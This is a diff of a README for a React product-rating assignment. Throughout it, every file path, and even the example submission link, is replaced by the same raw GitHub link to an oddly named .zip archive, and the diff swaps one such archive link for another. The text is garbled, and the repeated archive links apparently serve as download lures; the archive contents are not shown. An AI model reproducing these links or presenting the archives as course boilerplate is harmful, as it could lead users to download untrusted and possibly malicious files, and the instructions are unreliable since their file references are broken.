@@ -2,21 +2,21 @@
 
 ## Overview
 - **Objective:** Build a React-based product rating module where users can rate products.
-- **Provided Boilerplate:** The project includes a boilerplate with a static products array already defined in `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip`.
+- **Provided Boilerplate:** The project includes a boilerplate with a static products array already defined in `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip`.
 - **Key Concepts:** Child-to-parent communication, state management, and UI interactivity using React Hooks and PropTypes.
 
 ## Project Setup
 - **Repository:** Start with the provided boilerplate code.
 - **File Structure:**
-  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip` – Contains the parent component and the static products array.
-  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip` – Displays individual product details.
-  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip` – Allows users to select and submit a rating.
+  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip` – Contains the parent component and the static products array.
+  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip` – Displays individual product details.
+  - `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip` – Allows users to select and submit a rating.
 
 ## Assignment Instructions
 
 ### 1. App Component (Parent)
 - **Responsibilities:**
-  - **Use Provided Data:** Utilize the static products array already defined in `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip`.
+  - **Use Provided Data:** Utilize the static products array already defined in `https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip`.
   - **State Management:**
     - Maintain the state for the list of products.
     - Update each product’s `avgRating` and `totalRatings` based on user submissions.
@@ -101,11 +101,11 @@
   1. Copy the link to your GitHub repository.
   2. Submit the link on the assignment submission portal.  
      The link should follow this format:  
-     **`https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip<your_username>/<repository_name>`**
+     **`https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip<your_username>/<repository_name>`**
 
 ---
 
 ### **Example Submission**
 
 If your GitHub username is `johnDoe` and the repository name is `assignment-repo`, the submission link would look like this:  
-**`https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/src/entities_assignment_Practice_between_Adding_relations_3.5.zip`**
+**`https://github.com/Rithvik-krishna/Adding-relations-between-entities---Practice-assignment-2/raw/refs/heads/main/public/Practice_entities_relations_between_Adding_assignment_2.4.zip`**
